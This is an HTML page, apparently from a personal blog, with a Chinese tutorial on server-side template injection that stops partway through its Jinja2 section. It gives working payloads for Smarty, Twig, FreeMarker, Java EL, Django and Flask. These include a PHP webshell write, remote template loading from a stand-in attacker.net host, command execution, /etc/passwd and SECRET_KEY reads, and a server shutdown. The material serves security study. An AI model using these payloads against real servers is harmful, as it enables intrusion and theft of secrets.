@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>SSTI(一) - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SSTI(一)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-05 14:49" pubdate>
+        April 5, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      56
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SSTI(一)</h1>
+            
+            <div class="markdown-body">
+              <p><code>Server-Side-Template-Injection</code>，服务端模版注入攻击。</p>
+<p>服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射<code>(ORM)</code>。导致攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ { } }，即可将恶意代码注入模版中执行。<br>
+现在最常见的模版渲染引擎是基于Python的<code>Flask</code>框架，但是模板注入还存在于许多地方。<code>与 XSS 不同，模板注入可用于直接攻击 Web 服务器的内部，并经常获得远程代码执行，将每个易受攻击的应用程序都转变为潜在的枢轴点。</code>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过.</p>
+<h2 id="模板渲染"><a class="header-anchor" href="#模板渲染">🍭</a>模板渲染</h2>
+<p>模板是用于从数据（变量）到实际的视觉表现（HTML代码）的一种实现手段。</p>
+<h5 id="后端渲染"><a class="header-anchor" href="#后端渲染">🍭</a>后端渲染</h5>
+<p>浏览器直接接收经过服务器计算(服务器经过解析存放在服务器端的模板文件)之后的呈现给用户的最终的HTML字符串，在这种情况下，浏览器<strong>只进行了HTML的解析</strong>，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户.</p>
+<h5 id="前端渲染"><a class="header-anchor" href="#前端渲染">🍭</a>前端渲染</h5>
+<p>浏览器从后端得到一些信息(适用于angularjs的模板文件，或是JSON等各种数据交换格式所包装的数据，合法的HTML字符串)将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示.</p>
+<blockquote>
+<blockquote>
+<p>使用 render_template() 方法来渲染模板:将模板名和你想作为关键字的参数传入模板的变量</p>
+</blockquote>
+</blockquote>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
+
+@app.route(<span class="hljs-string">&#x27;/hello/&#x27;</span>)
+@app.route(<span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span>)
+def hello(<span class="hljs-type">name</span>=<span class="hljs-keyword">None</span>):
+     <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, <span class="hljs-type">name</span>=<span class="hljs-type">name</span>)</code></pre>
+<blockquote>
+<blockquote>
+<p>render_template函数渲染的是templates中的模板,也就是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p>
+</blockquote>
+</blockquote>
+<h4 id="常见模板引擎"><a class="header-anchor" href="#常见模板引擎">🍭</a>常见模板引擎</h4>
+<p><img src="/2021/04/05/wei/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p><em>PHP中还有一个Blade ，它和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译。</em></p>
+<p><em>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</em></p>
+<h4 id="PHP实例"><a class="header-anchor" href="#PHP实例">🍭</a>PHP实例</h4>
+<p>将名称传递到模板中：</p>
+<pre><code class="hljs php">$output = $twig-&gt;render(<span class="hljs-string">&quot;Dear &#123;first_name&#125;,&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre>
+<p>允许用户自定义这些电子邮件（开发者将用户的输入直接放在要渲染的字符串中）：</p>
+<pre><code class="hljs php">$output = $twig-&gt;render($_GET[<span class="hljs-string">&#x27;custom_email&#x27;</span>],  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre>
+<p>用户通过custom_email GET 参数控制模板本身的内容，而不是传递给模板的值。</p>
+<h4 id="python实例"><a class="header-anchor" href="#python实例">🍭</a>python实例</h4>
+<p>典型flask:</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
+    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
+    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
+    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string
+    app = Flask(__name__)
+<span class="hljs-meta">    @app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
+        template = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">            &lt;div class=&quot;center-content error&quot;&gt;</span>
+<span class="hljs-string">                &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span>
+<span class="hljs-string">                &lt;h3&gt;%s&lt;/h3&gt;</span>
+<span class="hljs-string">            &lt;/div&gt; </span>
+<span class="hljs-string">        &#x27;&#x27;&#x27;</span> %(request.url)  //程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的
+<span class="hljs-keyword">return</span> render_template_string(template)
+    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+        app.debug = <span class="hljs-literal">True</span>
+        app.run()</code></pre>
+<p><code>render_template_string</code>函数在渲染模板时使用%s动态地替换字符串，Flask 中使用Jinja2 作为模板渲染引擎，{ { } }是Jinja2的变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。<strong>flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。</strong></p>
+<blockquote>
+<p><strong>route装饰器路由</strong></p>
+<p><code>@app.route('/')</code></p>
+<blockquote>
+<p>使用route（）装饰器告诉Flask什么样的URL可触发函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如</p>
+<pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span>
+<span class="hljs-string">return 123</span></code></pre>
+<p>访问localhost:5000/则会输出123，修改一下:</p>
+<pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/test&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span>
+<span class="hljs-string">return 123</span></code></pre>
+<p>这时候访问localhost:5000/test会输出123,此外还可以设置动态网址:</p>
+<pre><code class="hljs ruby">@app.route(<span class="hljs-string">&quot;/hello/&lt;username&gt;&quot;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_user</span><span class="hljs-params">(username)</span></span><span class="hljs-symbol">:</span>
+<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user:%s&quot;</span>%username</code></pre>
+<p>根据url里的输入，动态辨别身份.也可以使用int型，转换器有下面几种：</p>
+<pre><code class="hljs ruby">int      接受整数
+float    同 int ，但是接受浮点数
+path     和默认的相似，但也接受斜线
+
+@app.route(<span class="hljs-string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_post</span><span class="hljs-params">(post_id)</span></span><span class="hljs-symbol">:</span>
+<span class="hljs-comment"># show the post with the given id, the id is an integer</span>
+<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Post %d&#x27;</span> % post_id</code></pre>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>main入口</p>
+<blockquote>
+<p>当.py文件被直接运行时，<code>if name == ‘main‘</code>之下的代码块将被运行；当.py文件以模块形式被导入时，<code>if name ==  ‘main‘</code>之下的代码块不被运行小脚本不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 <code>if name ==’main__’  </code>是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。</p>
+</blockquote>
+</blockquote>
+<h4 id="检测"><a class="header-anchor" href="#检测">🍭</a>检测</h4>
+<p>向传递的参数中承载特定 Payload  并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL  注入中有着不同的数据库类型一样。简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析。举例：</p>
+<p><img src="/2021/04/05/wei/3.jpg" srcset="/img/loading.gif" alt="3"></p>
+<h2 id="攻击"><a class="header-anchor" href="#攻击">🍭</a>攻击</h2>
+<h4 id="攻击方向-一"><a class="header-anchor" href="#攻击方向-一">🍭</a>攻击方向(一)</h4>
+<ul>
+<li>模板：语法、内置变量、属性、函数</li>
+<li>框架：全局变量、属性、函数</li>
+<li>语言</li>
+<li>应用</li>
+</ul>
+<h4 id="利用模板本身的特性进行攻击"><a class="header-anchor" href="#利用模板本身的特性进行攻击">🍭</a>利用模板本身的特性进行攻击</h4>
+<h5 id="Smarty"><a class="header-anchor" href="#Smarty">🍭</a>Smarty</h5>
+<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)，但实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty  这个类以后我们就去找 smarty 给我们的好用的方法，如：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fgithub.com%2Fsmarty-php%2Fsmarty%2Fblob%2Ffa269d418fb4d3687558746e67e054c225628d13%2Flibs%2Fsysplugins%2Fsmarty_internal_data.php%23L385&amp;r=https%3A%2F%2Fwww.k0rz3n.com%2F2018%2F11%2F12%2F%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E%2F%230X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">getStreamVariable()</a>可以获取传入变量的流（读文件）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a>(写文件)这个类中有一个writeFile方法:</p>
+<p><code>public function writeFile($_filepath, $_contents, Smarty $smarty)</code></p>
+<p>但第三个参数是一个 Smarty 类型</p>
+<p><code>self::clearConfig()</code></p>
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearConfig</span>(<span class="hljs-params">$varname = <span class="hljs-literal">null</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+<span class="hljs-keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="hljs-keyword">$this</span>, $varname);
+&#125;</code></pre>
+<p>payload:</p>
+<pre><code class="hljs php-template"><span class="xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> passthru($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;,self::clearConfig())&#125;</span></code></pre>
+</blockquote>
+<h5 id="Twig"><a class="header-anchor" href="#Twig">🍭</a>Twig</h5>
+<p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，不能使用 <code>self::</code> 调用静态变量了，但查询<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>:</p>
+<p><img src="/2021/04/05/wei/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>Twig 提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但有一个 env,env是指属性Twig_Environment对象，Twig_Environment对象有一个  setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置,Twig  的源码中的 environment.php:</p>
+<p><img src="/2021/04/05/wei/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>通过将缓存位置设置为远程服务器来引入远程文件包含漏洞,payload:</p>
+<pre><code class="hljs clojure">&#123; &#123;_self.env.setCache(<span class="hljs-string">&quot;ftp://attacker.net:2121&quot;</span>)&#125; &#125;
+&#123; &#123;_self.env.loadTemplate(<span class="hljs-string">&quot;backdoor&quot;</span>)&#125; &#125;</code></pre>
+<p>但因allow_url_include 一般是不打开的，没法包含远程文件，故需利用调用过滤器的函数 <a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
+<p>这个函数中调用了一个 call_user_function 方法</p>
+<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilter</span>(<span class="hljs-params">$name</span>)</span>
+<span class="hljs-function"></span>&#123;
+        [snip]
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filterCallbacks <span class="hljs-keyword">as</span> $callback) &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> !== $filter = call_user_func($callback, $name)) &#123;<span class="hljs-comment">//注意这行</span>
+            <span class="hljs-keyword">return</span> $filter;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">registerUndefinedFilterCallback</span>(<span class="hljs-params">$callable</span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">$this</span>-&gt;filterCallbacks[] = $callable;
+&#125;</code></pre>
+<p>把exec() 作为回调函数传进去即可，payload：</p>
+<pre><code class="hljs clojure">&#123; &#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125; &#125;
+&#123; &#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125; &#125;</code></pre>
+<h5 id="freeMarker"><a class="header-anchor" href="#freeMarker">🍭</a>freeMarker</h5>
+<p>payload:</p>
+<pre><code class="hljs vim">&lt;#assign <span class="hljs-keyword">ex</span>=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; <span class="hljs-keyword">ex</span>(<span class="hljs-string">&quot;id&quot;</span>) &#125;</code></pre>
+<h4 id="利用框架本身的特性进行攻击"><a class="header-anchor" href="#利用框架本身的特性进行攻击">🍭</a>利用框架本身的特性进行攻击</h4>
+<h5 id="Django"><a class="header-anchor" href="#Django">🍭</a>Django</h5>
+<p>思路:Django是一个庞大的框架，其数据库关系错综复杂，我们可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，故我们可以去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p>
+<p>Django自带的应用“admin”（后台）的models.py中导入了当前网站的配置文件：</p>
+<p><img src="/2021/04/05/wei/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>思路：通过某种方式找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
+<p>payload:</p>
+<pre><code class="hljs roboconf">http://localhost:8000/?email=&#123;<span class="hljs-attribute">user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span>
+<span class="hljs-attribute"></span>
+<span class="hljs-attribute">http</span>://localhost:8000/?email=&#123;user<span class="hljs-variable">.user_permissions</span><span class="hljs-variable">.model</span><span class="hljs-variable">._meta</span><span class="hljs-variable">.app_config</span><span class="hljs-variable">.module</span><span class="hljs-variable">.admin</span><span class="hljs-variable">.settings</span><span class="hljs-variable">.SECRET_KEY</span>&#125;</code></pre>
+<h4 id="利用模语言本身的特性进行攻击"><a class="header-anchor" href="#利用模语言本身的特性进行攻击">🍭</a>利用模语言本身的特性进行攻击</h4>
+<h5 id="python"><a class="header-anchor" href="#python">🍭</a>python</h5>
+<p><strong>os.system()</strong></p>
+<blockquote>
+<p>用法：os.system(command)</p>
+<blockquote>
+<p>这个调用相当直接，且是同步进行的，程序需要<strong>阻塞</strong>并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值。<br>
+注意：该函数返回命令<strong>执行结果的返回值</strong>，并不是返回命令的执行输出（执行成功返回0，失败返回-1）<br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/lwgkzl/article/details/81060016">关于linux下os.system()返回值说明</a></p>
+</blockquote>
+</blockquote>
+<p><strong>os.popen()</strong></p>
+<blockquote>
+<p>用法：os.popen(command[,mode[,bufsize]])</p>
+<blockquote>
+<p>说明：<strong>mode</strong> – 模式权限可以是 ‘r’(默认) 或 ‘w’。<br>
+popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。用read()可以把结果回显。</p>
+</blockquote>
+</blockquote>
+<p><strong>subprocess</strong></p>
+<blockquote>
+<p>subprocess 模块有比较多的功能，subprocess模块被推荐用来替换一些老的模块和函数，如：os.system、os.spawn、os.popen等<br>
+subprocess模块目的是<strong>启动一个新的进程并与之通信</strong>。这里只讲用来运行shell命令的两个常用方法。</p>
+<blockquote>
+<p><strong>subprocess.call(“command”)</strong><br>
+父进程等待子进程完成<br>
+返回退出信息(returncode，相当于Linux exit code)<br>
+与os.system功能相似,也无执行结果的回显</p>
+<p><strong>subprocess.Popen(“command”)</strong><br>
+说明：<code>class subprocess.Popen(args, bufsize=0, executable=None,  stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False,  shell=False, cwd=None, env=None, universal_newlines=False,  startupinfo=None, creationflags=0)</code><br>
+Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，<strong>它是一个阻塞的方法</strong>，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，<strong>Popen方法也不会打印出cmd的执行信息</strong>。</p>
+</blockquote>
+</blockquote>
+<h5 id="JAVA"><a class="header-anchor" href="#JAVA">🍭</a>JAVA</h5>
+<p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类。</p>
+<p>payload：</p>
+<pre><code class="hljs jboss-cli">$&#123;T<span class="hljs-params">(java.lang.System)</span><span class="hljs-string">.getenv</span><span class="hljs-params">()</span>&#125;
+
+$&#123;T<span class="hljs-params">(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(&#x27;cat etc/passwd&#x27;)</span>&#125;
+文件操作：
+$&#123;T<span class="hljs-params">(org.apache.commons.io.IOUtils)</span><span class="hljs-string">.toString</span><span class="hljs-params">(T(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span><span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(32)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(101)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(112)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(119)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(100)</span>))<span class="hljs-string">.getInputStream</span><span class="hljs-params">()</span>)&#125;</code></pre>
+<h3 id="攻击方向-二"><a class="header-anchor" href="#攻击方向-二">🍭</a>攻击方向(二)</h3>
+<blockquote>
+<p>查配置文件</p>
+<blockquote>
+<p>常见配置文件:</p>
+<blockquote>
+<p>request</p>
+<p>查看flask文档可知:<code>request</code>是Flask模版的一个全局对象，其代表“当前请求对象(flask.request)”，在视图中访问<code>request</code>对象能看到很多期待的信息。在<code>request</code> 对象中有一个<code>environ</code>对象名。<code>request.environ</code>对象是一个与服务器环境相关的对象字典，字典中一个名为<code>shutdown_server</code>的方法名分配的键为<code>werkzeug.server.shutdown</code>，注射<code>&#123; &#123; request.environ['werkzeug.server.shutdown']() &#125; &#125;</code>在服务端会形成一个影响极低的拒绝服务，使用gunicorn运行应用程序这个方法的效果便消失。</p>
+<p>config</p>
+<p><code>config</code>也是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，<code>SECRET_KEY</code>等敏感值。查看这些配置项目，只需注入<code>&#123; &#123; config.items() &#125; &#125;</code>有效载荷。它的子类包含多个独特的方法：<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, 以及<code>root_path</code></p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>命令执行（沙盒逃逸类题目的利用方式）</p>
+</blockquote>
+<h4 id="查配置文件"><a class="header-anchor" href="#查配置文件">🍭</a>查配置文件</h4>
+<h5 id="Flask-Jinja2"><a class="header-anchor" href="#Flask-Jinja2">🍭</a>Flask/Jinja2</h5>
+<p><strong>模板</strong></p>
+<pre><code class="hljs dust"><span class="hljs-template-variable">&#123; &#123; ... &#125;</span><span class="xml"> &#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span>
+<span class="hljs-template-variable">&#123; % ... % &#125;</span><span class="xml">：装载一个控制语句。</span>
+<span class="hljs-template-variable">&#123; # ... # &#125;</span><span class="xml">：装载一个注释，模板渲染的时候会忽视这中间的值</span></code></pre>
+<p><strong>变量</strong></p>
+<p>在模板中添加变量，可以使用（set）语句。</p>
